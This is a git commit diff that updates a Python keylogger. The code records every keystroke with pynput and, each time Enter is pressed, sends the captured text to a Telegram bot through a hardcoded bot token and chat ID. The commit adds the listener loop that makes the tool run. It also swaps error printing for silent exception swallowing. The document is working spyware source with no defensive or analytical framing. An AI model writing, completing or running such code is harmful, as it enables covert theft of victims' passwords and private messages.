73be7bf693067af2d941cfcb66037df1d871d2a6
syslog992 <sys.log.992@proton.me>
2026-09-18 16:13:09 -0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,32 +1,34 @@
 import requests
+from pynput.keyboard import Key, Listener
 
 TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
 CHAT_ID = "-1004356233671"
 
 buffer = ""
 
-def on_press(key):
-    global buffer
-    try:
-        # Se for uma tecla comum, adiciona ao buffer
-        buffer += key.char
-    except AttributeError:
-        # Se for tecla especial
-        if key == key.space:
-            buffer += " "
-        elif key == key.enter:
-            send_to_telegram(buffer) # Envia o bloco completo
-            buffer = "" # Limpa o buffer
-        elif key == key.backspace:
-            buffer = buffer[:-1] # Remove a última letra
-        elif key == key.tab:
-            buffer += " [TAB] "
-
 def send_to_telegram(text):
-    if text.strip(): # Evita enviar mensagens vazias
+    if text.strip():
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         payload = {"chat_id": CHAT_ID, "text": text}
         try:
             requests.post(url, data=payload)
-        except Exception as e:
-            print(f"Erro ao enviar: {e}")
+        except:
+            pass
+
+def on_press(key):
+    global buffer
+    try:
+        buffer += key.char
+    except AttributeError:
+        if key == Key.space:
+            buffer += " "
+        elif key == Key.enter:
+            send_to_telegram(buffer)
+            buffer = ""
+        elif key == Key.backspace:
+            buffer = buffer[:-1]
+        elif key == Key.tab:
+            buffer += " [TAB] "
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
